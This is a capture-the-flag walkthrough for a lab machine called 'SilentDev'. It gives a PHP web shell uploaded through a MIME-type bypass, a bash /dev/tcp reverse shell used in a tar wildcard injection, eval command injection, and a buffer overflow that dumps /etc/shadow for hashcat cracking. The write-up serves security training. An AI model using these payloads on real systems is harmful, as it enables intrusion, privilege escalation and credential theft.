---
title: "SilentDev - By me"
summary: "Difficulty: Medium 🟠"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://mega.nz/file/8hQhFCAY#jJoZto-I8qkrtyPAssrI6f68kKWXEPd9OKy_4_I4VXY)

The first thing we will do is perform a quick **Nmap** scan to see which **ports** are **open**.

![1](/images/writeups/silentdev/1.png)

Once we know the **open ports**, we will perform a more **detailed scan** on them to identify the **services** running and their **versions**.

![2](/images/writeups/silentdev/2.png)

The target machine is hosting an **SSH** server and a **website**.
When we access the website, we see that **we can upload** an image.

![3](/images/writeups/silentdev/3.png)

By enumerating **directories** and **files** with [**Gobuster**](https://github.com/OJ/gobuster), we discover the existence of a directory called ***/uploads***, nothing else is visible.

![4](/images/writeups/silentdev/4.png)

This is where the images uploaded by users are stored.

![5](/images/writeups/silentdev/5.png)

We try uploading an image to see if it works.

![6](/images/writeups/silentdev/6.png)

![7](/images/writeups/silentdev/7.png)

The only way I see to gain access to the machine is to **upload a file** that allows us to **execute commands** without the machine noticing, making it think it is just an image.
For example, we could embed **malicious PHP code** into a supposed image.

```
<?php
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

We will create a file on our local machine called ***cmd.php.jpg*** containing the previous code, and when uploading it, we will intercept the request with **Burp Suite**. In the “Filename” field, we will change it to ***cmd.php*** while keeping the **MIME type** as if it were an image.

![8](/images/writeups/silentdev/8.png)

![9](/images/writeups/silentdev/9.png)

We upload it without any issues, and now **we can execute any command**.

![10](/images/writeups/silentdev/10.png)

To access the machine, we will use a **Reverse Shell**.

![11](/images/writeups/silentdev/11.png)

![12](/images/writeups/silentdev/12.png)

Now that we are inside the machine, let’s see why it was so easy to exploit by uploading a **PHP file** without being detected.

![13](/images/writeups/silentdev/13.png)

As we can see, it only restricted by **MIME type**, without actually verifying that the file was truly an image or a GIF.

![14](/images/writeups/silentdev/14.png)

The **www-data** user is part of the **developers** group, and we see that they own two directories.

![15](/images/writeups/silentdev/15.png)

![16](/images/writeups/silentdev/16.png)

In ***/opt/project***, we find an **HTML file** for someone named **Vlad**, but there’s not much else here.

![17](/images/writeups/silentdev/17.png)

In the other directory, it seems to contain a backup of what looks like the previous project.

Since there’s nothing else particularly interesting, we could use the tool [**pspy**](https://github.com/DominicBreuker/pspy) to see which **processes** and **tasks** are running on the system in real time.

![18](/images/writeups/silentdev/18.png)

![19](/images/writeups/silentdev/19.png)

We can see that **every minute**, the **Developer** user performs a **backup** of everything in ***/opt/project***, placing it into a file called ***project.tgz*** inside ***/var/backups/*** and compressing it with **gzip** to save space.

It is vulnerable because we have **write permissions** and it uses `*` to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: [**Wildcard Injection**](https://conper.xyz/cybersecurity/vulnsandexp/linux/#wildcard-injection)

We execute the following commands in ***/opt/project*** and wait to receive the **shell**:

```
echo "bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1" > revshell.sh
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=bash revshell.sh"
```

![20](/images/writeups/silentdev/20.png)

We are now the **Developer** user.

![21](/images/writeups/silentdev/21.png)

By running the command **sudo -l**, we see that the script ***sysinfo.sh*** can be executed as **alfonso** without providing a password.

![22](/images/writeups/silentdev/22.png)

The script is vulnerable because it uses `eval` with user input, which allows executing dangerous commands. An attacker can exploit this to **run any command**.

To test this, in the first input we enter 1, and in the second input we enter the command `id`, but we precede it with a `;` to separate commands. It will then execute:

```
df; id
```

![23](/images/writeups/silentdev/23.png)

**It is vulnerable**, so it’s as simple as running a **Reverse Shell** to become **alfonso**.

![24](/images/writeups/silentdev/24.png)

![25](/images/writeups/silentdev/25.png)

Now we can retrieve the **User Flag**.

![26](/images/writeups/silentdev/26.png)

## Root Escalation

The last step is to escalate to **root**. Again, by using **sudo -l**, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to **root**.

![27](/images/writeups/silentdev/27.png)

We copy the file to **Alfonso**’s folder, start a temporary web server with **Python**, and **download** the binary to our **local machine** to test it in a more controlled environment.

![28](/images/writeups/silentdev/28.png)

![29](/images/writeups/silentdev/29.png)

We give it execution permissions and run it.

![30](/images/writeups/silentdev/30.png)

We can see that it outputs user data from ***/etc/passwd***.

Now, we will open it with [**Ghidra**](https://github.com/NationalSecurityAgency/ghidra) to **analyze** how it is implemented internally.

![31](/images/writeups/silentdev/31.png)

![32](/images/writeups/silentdev/32.png)

We can now see that it might be vulnerable to a **Buffer Overflow** because `gets(buffer)` allows writing more data than the buffer can hold, **overwriting memory** and potentially **executing malicious code**.

![33](/images/writeups/silentdev/33.png)

However, by examining the code further, we find a function that has never been executed, which prints the contents of the ***/etc/shadow*** file.

![34](/images/writeups/silentdev/34.png)

The plan is to exploit it using a **Buffer Overflow** to ultimately execute this function called `get_shadow`.

### Buffer Overflow Exploitation

We will first create the complete **payload** on our local machine using [**gdb**](https://sourceware.org/gdb/).
Here’s a guide on how to exploit a **buffer overflow to execute functions**: [**Buffer Overflow - Invoking Functions**](https://conper.xyz/cybersecurity/hacking/systemserviceexp/#introduction-to-buffer-overflow-invoking-functions-via-buffer-overflows)

First, we create a **pattern** to find the **offset** and run the script, providing this pattern as input.

> 📝**NOTE**: In a **Buffer Overflow**, the **offset** is the **number of bytes** needed to reach the return address, which in x86 corresponds to the **EIP**. Overwriting it allows **controlling where the program jumps** when the function ends.

![35](/images/writeups/silentdev/35.png)

```
r <<< 'PATTERN'
```

![36](/images/writeups/silentdev/36.png)

Now we can calculate **how many characters** are needed to reach the **EIP** with this command:

```
pattern offset $eip
```

![37](/images/writeups/silentdev/37.png)

We can verify it like this to confirm the **offset** is actually **76**:

```
r <<< $(python3 -c 'print("A"*76 + "B"*4)')
```

![38](/images/writeups/silentdev/38.png)

It is indeed **76**. Next, we need the **memory address** of the `get_shadow` **function** we found earlier in **Ghidra**.

```
p get_shadow
```

![39](/images/writeups/silentdev/39.png)

We must write the address in **little-endian** (for example, `0x080484b6` as `\xb6\x84\x04\x08`), since systems store multi-byte values in that order for the function to execute correctly.

In our case, it will be:

```
\x05\x99\x04\x08
```
<h6>We start converting from the end to the beginning.</h6>

Now we have everything. Instead of `BBBB`, we use `\x05\x99\x04\x08`. The best way to execute it is:

```
./silentgets <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x05\x99\x04\x08")')
```

We will run it directly on the **target machine**, using **sudo** and the full path to the binary.

```
sudo /usr/bin/silentgets <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x05\x99\x04\x08")')
```

![40](/images/writeups/silentdev/40.png)

We obtain the **root** user’s password **hash**, which we will crack using [**hashcat**](https://hashcat.net/hashcat/).

```
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

![41](/images/writeups/silentdev/41.png)

**Password obtained**! We log in as **root** and finally get the **Root Flag**.

![42](/images/writeups/silentdev/42.png)

Machine completed!!